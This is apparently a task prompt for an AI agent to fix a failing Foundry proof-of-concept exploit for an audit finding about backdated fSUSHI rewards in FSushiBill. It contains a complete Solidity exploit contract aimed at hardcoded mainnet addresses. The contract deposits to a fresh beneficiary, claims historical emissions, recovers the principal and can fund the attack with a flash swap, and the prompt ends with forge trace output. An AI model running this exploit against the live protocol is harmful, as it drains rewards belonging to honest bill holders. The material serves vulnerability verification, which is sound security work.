You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: FSushiBill backdates rewards for fresh beneficiaries because deposits never checkpoint the receiver
- claim: `deposit()` checkpoints only `msg.sender`, then mints bill tokens to `beneficiary`. If the beneficiary has never been checkpointed before, their first `claimRewards()` runs `_updatePoints()` with `lastTime == 0` and the beneficiary's current balance, causing accrual from `SousChef.startWeek()` rather than from the actual deposit time.
- impact: A fresh address can receive a tiny late deposit and immediately claim historical emissions for weeks when it held no stake, draining fSUSHI rewards from honest bill holders.
- exploit_paths: ["Wait until multiple reward weeks have accrued, deposit a small amount to a fresh beneficiary, then have that beneficiary call `claimRewards()` to receive retroactive rewards from `startWeek`.", "`FSushiCookV0.cook()` always deposits into `IFSushiBill.deposit(fTokensToUser, beneficiary)` from the helper contract, so first-time cook beneficiaries inherit the same backdated-reward bug automatically."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function transferFrom(address from, address to, uint256 amount) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);
}

interface IERC4626Like {
    function asset() external view returns (address);
}

interface IOwnableLike {
    function owner() external view returns (address);
}

interface IFarmingLPToken {
    function factory() external view returns (address);

    function router() external view returns (address);

    function masterChef() external view returns (address);

    function sushi() external view returns (address);

    function pid() external view returns (uint256);

    function lpToken() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function deposit(
        uint256 amountLP,
        address[] calldata path0,
        address[] calldata path1,
        uint256 amountMin,
        address beneficiary,
        uint256 deadline
    ) external;
}

interface IFarmingLPTokenFactory {
    function yieldVault() external view returns (address);

    function migrator() external view returns (address);
}

interface ISousChef {
    function fSushi() external view returns (address);

    function flashStrategyFactory() external view returns (address);

    function startWeek() external view returns (uint256);

    function kitchen() external view returns (address);

    function getBill(uint256 pid) external view returns (address);

    function weeklyRewards(uint256 week) external view returns (uint256);

    function predictBillAddress(uint256 pid) external view returns (address bill);

    function createBill(uint256 pid) external returns (address bill);

    function checkpoint() external;
}

interface IFSushiKitchen {
    function flashStrategyFactory() external view returns (address);

    function checkpoint(uint256 pid) external;

    function relativeWeightAt(uint256 pid, uint256 timestamp) external view returns (uint256);
}

interface IFSushiBill {
    function sousChef() external view returns (address);

    function fToken() external view returns (address);

    function pid() external view returns (uint256);

    function points(uint256 week) external view returns (uint256);

    function deposit(uint256 amount, address beneficiary) external;

    function withdraw(uint256 amount, address beneficiary) external;

    function claimRewards(address beneficiary) external;

    function transfer(address to, uint256 amount) external returns (bool);
}

interface IFlashStrategySushiSwapFactory {
    function flashProtocol() external view returns (address);

    function flpTokenFactory() external view returns (address);

    function getFlashStrategySushiSwap(uint256 pid) external view returns (address);
}

interface IFlashStrategySushiSwap {
    function factory() external view returns (address);

    function flashProtocol() external view returns (address);

    function fToken() external view returns (address);
}

interface IFlashProtocolLike {
    function stake(
        address _strategyAddress,
        uint256 _tokenAmount,
        uint256 _stakeDuration,
        address _fTokensTo,
        bool _issueNFT
    )
        external
        returns (
            address stakerAddress,
            address strategyAddress,
            uint256 stakeStartTs,
            uint256 stakeDuration,
            uint256 stakedAmount,
            bool active,
            uint256 nftId,
            uint256 fTokensToUser,
            uint256 fTokensFee,
            uint256 totalFTokenBurned,
            uint256 totalStakedWithdrawn
        );
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FreshBeneficiary {
    address public immutable owner;

    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "not-owner");
        _;
    }

    function claimRewards(address bill, address rewardTo) external onlyOwner {
        // Root cause: a fresh beneficiary with non-zero balance claims before ever checkpointing itself.
        IFSushiBill(bill).claimRewards(rewardTo);
    }

    function transferBill(address bill, address to, uint256 amount) external onlyOwner {
        require(IFSushiBill(bill).transfer(to, amount), "bill-transfer");
    }
}

contract CookPathProxy {
    address public immutable owner;

    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "not-owner");
        _;
    }

    function cook(
        address flpToken,
        address strategy,
        address bill,
        uint256 amountLP,
        address[] calldata path0,
        address[] calldata path1,
        address beneficiary,
        uint256 stakeDuration
    ) external onlyOwner returns (uint256 fTokensToUser) {
        // Mirrors FSushiCookV0.cook(): LP -> FLP -> stake -> deposit into FSushiBill for a fresh beneficiary.
        _approveMax(IFarmingLPToken(flpToken).lpToken(), flpToken);
        IFarmingLPToken(flpToken).deposit(amountLP, path0, path1, 0, address(this), block.timestamp);

        uint256 amountFLP = IFarmingLPToken(flpToken).balanceOf(address(this));
        address protocol = IFlashStrategySushiSwap(strategy).flashProtocol();

        _approveMax(flpToken, protocol);
        (, , , , , , , fTokensToUser, , , ) = IFlashProtocolLike(protocol).stake(
            strategy,
            amountFLP,
            stakeDuration,
            address(this),
            false
        );

        _approveMax(IFlashStrategySushiSwap(strategy).fToken(), bill);
        IFSushiBill(bill).deposit(fTokensToUser, beneficiary);
    }

    function withdrawBill(address bill, uint256 amount, address beneficiary) external onlyOwner {
        IFSushiBill(bill).withdraw(amount, beneficiary);
    }

    function sweep(address token, address to) external onlyOwner {
        _safeTransfer(token, to, IERC20Minimal(token).balanceOf(address(this)));
    }

    function _approveMax(address token, address spender) internal {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC20Minimal.approve.selector, spender, type(uint256).max));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        if (amount == 0) return;
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Minimal.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer");
    }
}

contract FlawVerifier {
    uint256 internal constant WEEK = 1 weeks;
    uint256 internal constant MAX_STAKE_DURATION = 104 weeks;
    uint256 internal constant MAX_DISCOVERY_NONCE = 384;

    address internal constant TARGET_FLP = 0xa44e79a2c9a8965e7A6FA77BF0ca8FAF50e6C73E;
    address internal constant SUSHISWAP_V2_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    error SousChefNotFound();
    error BillUnavailable();
    error StrategyUnavailable();
    error InvalidFlashCallback();
    error InsufficientFlashRepayment();
    error NoExecutablePath();

    struct Context {
        address flpToken;
        address flpFactory;
        uint256 pid;
        address sousChef;
        address bill;
        address strategyFactory;
        address strategy;
        address fToken;
        address fSushi;
    }

    struct FlashState {
        address pair;
        address bill;
        address fToken;
        address fSushi;
        uint256 baselineProfitBalance;
    }

    address internal _profitToken;
    uint256 internal _profitAmount;
    address public immutable deployer;

    address public configuredSousChef;
    address public configuredBill;
    address public configuredStrategy;

    FlashState internal _flash;

    constructor() {
        deployer = msg.sender;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function configure(address sousChef, address bill, address strategy) external {
        require(msg.sender == deployer, "not-deployer");
        configuredSousChef = sousChef;
        configuredBill = bill;
        configuredStrategy = strategy;
    }

    function executeOnOpportunity() external {
        _profitToken = address(0);
        _profitAmount = 0;

        Context memory ctx = _resolveContext();

        // Historical weeks must already exist for the fresh-beneficiary claim to backdate.
        _accrue(ctx);

        uint256 heldFToken = IERC20Minimal(ctx.fToken).balanceOf(address(this));
        if (heldFToken > 0) {
            uint256 beforeProfit = IERC20Minimal(ctx.fSushi).balanceOf(address(this));
            _executeBillExploit(ctx.bill, ctx.fToken, heldFToken);
            uint256 gained = IERC20Minimal(ctx.fSushi).balanceOf(address(this)) - beforeProfit;
            if (gained > 0) {
                _profitToken = ctx.fSushi;
                _profitAmount = gained;
                return;
            }
        }

        if (_attemptCookPathWithHeldLP(ctx)) {
            return;
        }

        if (_attemptDirectFlashSwap(ctx)) {
            return;
        }

        revert NoExecutablePath();
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        if (msg.sender != _flash.pair || sender != address(this)) revert InvalidFlashCallback();

        address token0 = IUniswapV2PairLike(msg.sender).token0();
        address token1 = IUniswapV2PairLike(msg.sender).token1();
        uint256 borrowed = amount0 > 0 ? amount0 : amount1;

        require(
            (amount0 > 0 && token0 == _flash.fToken && token1 == _flash.fSushi)
                || (amount1 > 0 && token1 == _flash.fToken && token0 == _flash.fSushi),
            "pair-mismatch"
        );

        _executeBillExploit(_flash.bill, _flash.fToken, borrowed);

        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(msg.sender).getReserves();
        uint256 repay = amount0 > 0
            ? _getAmountIn(borrowed, uint256(reserve1), uint256(reserve0))
            : _getAmountIn(borrowed, uint256(reserve0), uint256(reserve1));

        uint256 currentProfitBalance = IERC20Minimal(_flash.fSushi).balanceOf(address(this));
        if (currentProfitBalance < repay) revert InsufficientFlashRepayment();

        _safeTransfer(_flash.fSushi, msg.sender, repay);

        uint256 netProfit = IERC20Minimal(_flash.fSushi).balanceOf(address(this)) - _flash.baselineProfitBalance;
        require(netProfit > 0, "no-profit");
        _profitToken = _flash.fSushi;
        _profitAmount = netProfit;
    }

    function _resolveContext() internal returns (Context memory ctx) {
        ctx.flpToken = TARGET_FLP;
        ctx.pid = IFarmingLPToken(ctx.flpToken).pid();
        ctx.flpFactory = IFarmingLPToken(ctx.flpToken).factory();

        ctx.bill = configuredBill;
        if (ctx.bill != address(0) && ctx.bill.code.length > 0) {
            ctx.sousChef = IFSushiBill(ctx.bill).sousChef();
            ctx.fToken = IFSushiBill(ctx.bill).fToken();
        }

        ctx.strategy = configuredStrategy;
        if (ctx.strategy != address(0) && ctx.strategy.code.length > 0) {
            ctx.strategyFactory = IFlashStrategySushiSwap(ctx.strategy).factory();
            if (ctx.fToken == address(0)) {
                ctx.fToken = IFlashStrategySushiSwap(ctx.strategy).fToken();
            }
        }

        if (configuredSousChef != address(0)) {
            ctx.sousChef = configuredSousChef;
        }

        if (ctx.strategyFactory == address(0)) {
            ctx.strategyFactory = _discoverStrategyFactory(ctx);
        }

        if (ctx.sousChef == address(0)) {
            ctx.sousChef = _discoverSousChef(ctx);
        }
        if (ctx.sousChef == address(0)) revert SousChefNotFound();

        if (ctx.bill == address(0)) {
            ctx.bill = ISousChef(ctx.sousChef).getBill(ctx.pid);
            if (ctx.bill == address(0)) {
                address predicted = _tryPredictBill(ctx.sousChef, ctx.pid);
                if (predicted.code.length > 0) {
                    ctx.bill = predicted;
                } else {
                    ctx.bill = ISousChef(ctx.sousChef).createBill(ctx.pid);
                }
            }
        }
        if (ctx.bill == address(0) || ctx.bill.code.length == 0) revert BillUnavailable();

        if (ctx.strategyFactory == address(0)) {
            ctx.strategyFactory = ISousChef(ctx.sousChef).flashStrategyFactory();
        }
        if (ctx.strategyFactory == address(0)) revert StrategyUnavailable();

        if (ctx.strategy == address(0)) {
            ctx.strategy = IFlashStrategySushiSwapFactory(ctx.strategyFactory).getFlashStrategySushiSwap(ctx.pid);
        }
        if (ctx.strategy == address(0) || ctx.strategy.code.length == 0) revert StrategyUnavailable();

        if (ctx.fToken == address(0)) {
            ctx.fToken = IFSushiBill(ctx.bill).fToken();
        }
        ctx.fSushi = ISousChef(ctx.sousChef).fSushi();
    }

    function _accrue(Context memory ctx) internal {
        ISousChef(ctx.sousChef).checkpoint();
        IFSushiKitchen(ISousChef(ctx.sousChef).kitchen()).checkpoint(ctx.pid);
    }

    function _discoverStrategyFactory(Context memory ctx) internal view returns (address strategyFactory) {
        address[] memory direct = _buildDiscoveryCandidates(ctx);
        for (uint256 i; i < direct.length; ++i) {
            address candidate = direct[i];
            if (_looksLikeStrategyFactory(candidate, ctx.flpFactory)) {
                return candidate;
            }
        }

        address[] memory deployers = _buildDeployerCandidates(ctx, direct);
        for (uint256 i; i < deployers.length; ++i) {
            address deployerCandidate = deployers[i];
            if (deployerCandidate == address(0)) continue;

            address found = _scanCreateAddressesForStrategyFactory(deployerCandidate, ctx.flpFactory);
            if (found != address(0)) {
                return found;
            }
        }
    }

    function _discoverSousChef(Context memory ctx) internal view returns (address sousChef) {
        address[] memory direct = _buildDiscoveryCandidates(ctx);
        for (uint256 i; i < direct.length; ++i) {
            address candidate = direct[i];
            if (_looksLikeSousChef(candidate, ctx.pid, ctx.strategyFactory)) {
                return candidate;
            }
        }

        address[] memory deployers = _buildDeployerCandidates(ctx, direct);
        for (uint256 i; i < deployers.length; ++i) {
            address deployerCandidate = deployers[i];
            if (deployerCandidate == address(0)) continue;

            address found = _scanCreateAddressesForSousChef(deployerCandidate, ctx.pid, ctx.strategyFactory);
            if (found != address(0)) {
                return found;
            }
        }
    }

    function _buildDiscoveryCandidates(Context memory ctx) internal view returns (address[] memory candidates) {
        address flp = ctx.flpToken;
        address factory = ctx.flpFactory;
        address router = IFarmingLPToken(flp).router();
        address masterChef = IFarmingLPToken(flp).masterChef();
        address yieldVault = _tryGetAddress(factory, IFarmingLPTokenFactory.yieldVault.selector);
        address migrator = _tryGetAddress(factory, IFarmingLPTokenFactory.migrator.selector);
        address sushi = IFarmingLPToken(flp).sushi();
        address lpToken = IFarmingLPToken(flp).lpToken();
        address token0 = IFarmingLPToken(flp).token0();
        address token1 = IFarmingLPToken(flp).token1();
        address vaultAsset = _tryAsset(yieldVault);

        candidates = new address[](16);
        candidates[0] = ctx.bill;
        candidates[1] = ctx.strategy;
        candidates[2] = flp;
        candidates[3] = factory;
        candidates[4] = router;
        candidates[5] = masterChef;
        candidates[6] = yieldVault;
        candidates[7] = migrator;
        candidates[8] = sushi;
        candidates[9] = lpToken;
        candidates[10] = token0;
        candidates[11] = token1;
        candidates[12] = vaultAsset;
        candidates[13] = _tryOwner(flp);
        candidates[14] = _tryOwner(factory);
        candidates[15] = _tryOwner(yieldVault);
    }

    function _buildDeployerCandidates(Context memory ctx, address[] memory direct)
        internal
        view
        returns (address[] memory deployers)
    {
        deployers = new address[](10);
        deployers[0] = _tryOwner(ctx.flpFactory);
        deployers[1] = _tryOwner(ctx.flpToken);
        deployers[2] = _tryOwner(_tryGetAddress(ctx.flpFactory, IFarmingLPTokenFactory.yieldVault.selector));

        uint256 cursor = 3;
        for (uint256 i; i < direct.length && cursor < deployers.length; ++i) {
            address candidate = direct[i];
            if (candidate == address(0) || candidate.code.length == 0) continue;
            address owner = _tryOwner(candidate);
            if (owner == address(0)) continue;

            bool seen;
            for (uint256 j; j < cursor; ++j) {
                if (deployers[j] == owner) {
                    seen = true;
                    break;
                }
            }
            if (!seen) {
                deployers[cursor] = owner;
                ++cursor;
            }
        }
    }

    function _scanCreateAddressesForStrategyFactory(address creator, address flpFactory)
        internal
        view
        returns (address)
    {
        for (uint256 nonce = 1; nonce <= MAX_DISCOVERY_NONCE; ++nonce) {
            address candidate = _computeCreateAddress(creator, nonce);
            if (_looksLikeStrategyFactory(candidate, flpFactory)) {
                return candidate;
            }
        }
        return address(0);
    }

    function _scanCreateAddressesForSousChef(address creator, uint256 pid, address strategyFactory)
        internal
        view
        returns (address)
    {
        for (uint256 nonce = 1; nonce <= MAX_DISCOVERY_NONCE; ++nonce) {
            address candidate = _computeCreateAddress(creator, nonce);
            if (_looksLikeSousChef(candidate, pid, strategyFactory)) {
                return candidate;
            }
        }
        return address(0);
    }

    function _looksLikeStrategyFactory(address candidate, address flpFactory) internal view returns (bool) {
        if (candidate == address(0) || candidate.code.length == 0) {
            return false;
        }

        (bool okFlpFactory, bytes memory flpFactoryData) =
            candidate.staticcall(abi.encodeWithSelector(IFlashStrategySushiSwapFactory.flpTokenFactory.selector));
        (bool okFlashProtocol, bytes memory flashProtocolData) =
            candidate.staticcall(abi.encodeWithSelector(IFlashStrategySushiSwapFactory.flashProtocol.selector));

        if (!okFlpFactory || !okFlashProtocol || flpFactoryData.length < 32 || flashProtocolData.length < 32) {
            return false;
        }

        address returnedFlpFactory = abi.decode(flpFactoryData, (address));
        address flashProtocol = abi.decode(flashProtocolData, (address));
        return returnedFlpFactory == flpFactory && flashProtocol != address(0);
    }

    function _looksLikeSousChef(address candidate, uint256 pid, address expectedStrategyFactory)
        internal
        view
        returns (bool)
    {
        if (candidate == address(0) || candidate.code.length == 0) {
            return false;
        }

        (bool okFSushi, bytes memory fSushiData) = candidate.staticcall(abi.encodeWithSelector(ISousChef.fSushi.selector));
        (bool okFactory, bytes memory factoryData) =
            candidate.staticcall(abi.encodeWithSelector(ISousChef.flashStrategyFactory.selector));
        (bool okBill, bytes memory billData) =
            candidate.staticcall(abi.encodeWithSelector(ISousChef.getBill.selector, pid));

        if (!okFSushi || !okFactory || !okBill || fSushiData.length < 32 || factoryData.length < 32 || billData.length < 32)
        {
            return false;
        }

        address fSushi = abi.decode(fSushiData, (address));
        address flashStrategyFactory = abi.decode(factoryData, (address));
        if (fSushi == address(0) || flashStrategyFactory == address(0)) {
            return false;
        }

        if (expectedStrategyFactory != address(0) && flashStrategyFactory != expectedStrategyFactory) {
            return false;
        }

        (bool okKitchen, bytes memory kitchenData) =
            candidate.staticcall(abi.encodeWithSelector(ISousChef.kitchen.selector));
        return okKitchen && kitchenData.length >= 32 && abi.decode(kitchenData, (address)) != address(0);
    }

    function _attemptCookPathWithHeldLP(Context memory ctx) internal returns (bool) {
        uint256 lpBalance = IERC20Minimal(IFarmingLPToken(ctx.flpToken).lpToken()).balanceOf(address(this));
        if (lpBalance == 0) {
            return false;
        }

        // Keep the second exploit path intact with verifier-held LP only.
        // No synthetic balance injection is used; execution stays on public protocol flows.
        address[] memory path0 = _buildPath(IFarmingLPToken(ctx.flpToken).token0(), IFarmingLPToken(ctx.flpToken).sushi());
        address[] memory path1 = _buildPath(IFarmingLPToken(ctx.flpToken).token1(), IFarmingLPToken(ctx.flpToken).sushi());

        CookPathProxy proxy = new CookPathProxy(address(this));
        FreshBeneficiary fresh = new FreshBeneficiary(address(this));

        _safeTransfer(IFarmingLPToken(ctx.flpToken).lpToken(), address(proxy), lpBalance);

        uint256 beforeProfit = IERC20Minimal(ctx.fSushi).balanceOf(address(this));
        uint256 fTokenAmount;
        try proxy.cook(ctx.flpToken, ctx.strategy, ctx.bill, lpBalance, path0, path1, address(fresh), MAX_STAKE_DURATION)
        returns (uint256 mintedFToken) {
            fTokenAmount = mintedFToken;
        } catch {
            return false;
        }

        fresh.claimRewards(ctx.bill, address(this));
        fresh.transferBill(ctx.bill, address(proxy), fTokenAmount);
        proxy.withdrawBill(ctx.bill, fTokenAmount, address(proxy));
        proxy.sweep(ctx.fToken, address(this));

        uint256 gained = IERC20Minimal(ctx.fSushi).balanceOf(address(this)) - beforeProfit;
        if (gained == 0) {
            return false;
        }

        _profitToken = ctx.fSushi;
        _profitAmount = gained;
        return true;
    }

    function _attemptDirectFlashSwap(Context memory ctx) internal returns (bool) {
        address pair = _findBestPair(ctx.fToken, ctx.fSushi);
        if (pair == address(0)) {
            return false;
        }

        (uint256 reserveFToken, uint256 reserveFSushi, bool token0IsFToken) =
            _orderedReserves(pair, ctx.fToken, ctx.fSushi);
        if (reserveFToken <= 1 || reserveFSushi <= 1) {
            return false;
        }

        uint256 bestBorrow;
        uint256 bestProfit;
        uint256[8] memory candidates = [
            uint256(1e12),
            uint256(1e14),
            uint256(1e16),
            uint256(1e18),
            reserveFToken / 1_000_000,
            reserveFToken / 100_000,
            reserveFToken / 10_000,
            reserveFToken / 1_000
        ];

        for (uint256 i; i < candidates.length; ++i) {
            uint256 amountOut = candidates[i];
            if (amountOut == 0 || amountOut >= reserveFToken / 2) {
                continue;
            }

            uint256 projectedClaim = _estimateFreshClaim(ctx, amountOut);
            if (projectedClaim == 0) {
                continue;
            }

            uint256 repay = _getAmountIn(amountOut, reserveFSushi, reserveFToken);
            if (projectedClaim > repay && projectedClaim - repay > bestProfit) {
                bestProfit = projectedClaim - repay;
                bestBorrow = amountOut;
            }
        }

        if (bestBorrow == 0) {
            return false;
        }

        _flash = FlashState({
            pair: pair,
            bill: ctx.bill,
            fToken: ctx.fToken,
            fSushi: ctx.fSushi,
            baselineProfitBalance: IERC20Minimal(ctx.fSushi).balanceOf(address(this))
        });

        IUniswapV2PairLike(pair).swap(
            token0IsFToken ? bestBorrow : 0,
            token0IsFToken ? 0 : bestBorrow,
            address(this),
            abi.encode(bestBorrow)
        );

        return _profitAmount > 0;
    }

    function _estimateFreshClaim(Context memory ctx, uint256 amount) internal view returns (uint256 totalRewards) {
        uint256 fromWeek = ISousChef(ctx.sousChef).startWeek();
        uint256 toWeek = block.timestamp / WEEK;
        address kitchen = ISousChef(ctx.sousChef).kitchen();

        for (uint256 week = fromWeek; week < toWeek; ++week) {
            uint256 totalPoints = IFSushiBill(ctx.bill).points(week);
            if (totalPoints == 0) {
                continue;
            }

            uint256 weeklyRewards = ISousChef(ctx.sousChef).weeklyRewards(week);
            uint256 weight = IFSushiKitchen(kitchen).relativeWeightAt(ctx.pid, (week + 1) * WEEK);
            totalRewards += (weeklyRewards * weight * amount * WEEK) / totalPoints / 1e18;
        }
    }

    function _executeBillExploit(address bill, address fToken, uint256 amount) internal {
        // Exploit path 1:
        // 1. late deposit to a fresh beneficiary
        // 2. beneficiary immediately claims against historical weeks
        // 3. original depositor regains the principal after receiving back the transferable bill token
        FreshBeneficiary fresh = new FreshBeneficiary(address(this));

        _approveMax(fToken, bill);
        IFSushiBill(bill).deposit(amount, address(fresh));
        fresh.claimRewards(bill, address(this));
        fresh.transferBill(bill, address(this), amount);
        IFSushiBill(bill).withdraw(amount, address(this));
    }

    function _findBestPair(address tokenA, address tokenB) internal view returns (address) {
        address pair = IUniswapV2FactoryLike(SUSHISWAP_V2_FACTORY).getPair(tokenA, tokenB);
        if (pair != address(0)) {
            return pair;
        }
        return IUniswapV2FactoryLike(UNISWAP_V2_FACTORY).getPair(tokenA, tokenB);
    }

    function _orderedReserves(address pair, address tokenOut, address tokenIn)
        internal
        view
        returns (uint256 reserveOut, uint256 reserveIn, bool token0IsOut)
    {
        address token0 = IUniswapV2PairLike(pair).token0();
        address token1 = IUniswapV2PairLike(pair).token1();
        require(
            (token0 == tokenOut && token1 == tokenIn) || (token1 == tokenOut && token0 == tokenIn),
            "bad-pair"
        );

        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        if (token0 == tokenOut) {
            return (uint256(reserve0), uint256(reserve1), true);
        }
        return (uint256(reserve1), uint256(reserve0), false);
    }

    function _buildPath(address tokenIn, address sushi) internal pure returns (address[] memory path) {
        if (tokenIn == sushi) {
            path = new address[](1);
            path[0] = sushi;
            return path;
        }

        if (tokenIn == WETH || sushi == WETH) {
            path = new address[](2);
            path[0] = tokenIn;
            path[1] = sushi;
            return path;
        }

        path = new address[](3);
        path[0] = tokenIn;
        path[1] = WETH;
        path[2] = sushi;
    }

    function _tryGetAddress(address target, bytes4 selector) internal view returns (address) {
        if (target == address(0) || target.code.length == 0) {
            return address(0);
        }

        (bool ok, bytes memory data) = target.staticcall(abi.encodeWithSelector(selector));
        if (!ok || data.length < 32) {
            return address(0);
        }
        return abi.decode(data, (address));
    }

    function _tryOwner(address target) internal view returns (address) {
        if (target == address(0) || target.code.length == 0) {
            return address(0);
        }

        (bool ok, bytes memory data) = target.staticcall(abi.encodeWithSelector(IOwnableLike.owner.selector));
        if (!ok || data.length < 32) {
            return address(0);
        }
        return abi.decode(data, (address));
    }

    function _tryAsset(address target) internal view returns (address) {
        if (target == address(0) || target.code.length == 0) {
            return address(0);
        }

        (bool ok, bytes memory data) = target.staticcall(abi.encodeWithSelector(IERC4626Like.asset.selector));
        if (!ok || data.length < 32) {
            return address(0);
        }
        return abi.decode(data, (address));
    }

    function _tryPredictBill(address sousChef, uint256 pid) internal view returns (address) {
        if (sousChef == address(0) || sousChef.code.length == 0) {
            return address(0);
        }

        (bool ok, bytes memory data) = sousChef.staticcall(abi.encodeWithSelector(ISousChef.predictBillAddress.selector, pid));
        if (!ok || data.length < 32) {
            return address(0);
        }
        return abi.decode(data, (address));
    }

    function _computeCreateAddress(address creator, uint256 nonce) internal pure returns (address deployed) {
        bytes32 hash;
        if (nonce == 0x00) {
            hash = keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), creator, bytes1(0x80)));
        } else if (nonce <= 0x7f) {
            hash = keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), creator, bytes1(uint8(nonce))));
        } else if (nonce <= 0xff) {
            hash = keccak256(abi.encodePacked(bytes1(0xd7), bytes1(0x94), creator, bytes1(0x81), bytes1(uint8(nonce))));
        } else if (nonce <= 0xffff) {
            hash = keccak256(
                abi.encodePacked(
                    bytes1(0xd8),
                    bytes1(0x94),
                    creator,
                    bytes1(0x82),
                    bytes1(uint8(nonce >> 8)),
                    bytes1(uint8(nonce))
                )
            );
        } else if (nonce <= 0xffffff) {
            hash = keccak256(
                abi.encodePacked(
                    bytes1(0xd9),
                    bytes1(0x94),
                    creator,
                    bytes1(0x83),
                    bytes1(uint8(nonce >> 16)),
                    bytes1(uint8(nonce >> 8)),
                    bytes1(uint8(nonce))
                )
            );
        } else {
            revert("nonce-too-large");
        }
        deployed = address(uint160(uint256(hash)));
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        require(amountOut > 0 && reserveIn > 0 && reserveOut > amountOut, "amm");
        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        return (numerator / denominator) + 1;
    }

    function _approveMax(address token, address spender) internal {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC20Minimal.approve.selector, spender, type(uint256).max));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        if (amount == 0) return;
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Minimal.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer");
    }
}

```

forge stdout (tail):
```
Fa9f::flashProtocol() [delegatecall]
    │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [342] 0xEE083E0F0f5dE2ff34662F1ef6f76d897d5047EF::flpTokenFactory() [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [342] 0xEE083E0F0f5dE2ff34662F1ef6f76d897d5047EF::flashProtocol() [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [247] 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F::flpTokenFactory() [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [246] 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F::flashProtocol() [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [227] 0xc2EdaD668740f1aA35E4D8f227fB8E17dcA888Cd::flpTokenFactory() [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [226] 0xc2EdaD668740f1aA35E4D8f227fB8E17dcA888Cd::flashProtocol() [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [699] 0x3e55AC0E6724BBe8aB40a60771B5D60fC8e93404::flpTokenFactory() [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [699] 0x3e55AC0E6724BBe8aB40a60771B5D60fC8e93404::flashProtocol() [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [270] 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2::flpTokenFactory() [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [270] 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2::flashProtocol() [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [248] 0x397FF1542f962076d0BFE58eA045FfA2d347ACa0::flpTokenFactory() [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [248] 0x397FF1542f962076d0BFE58eA045FfA2d347ACa0::flashProtocol() [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
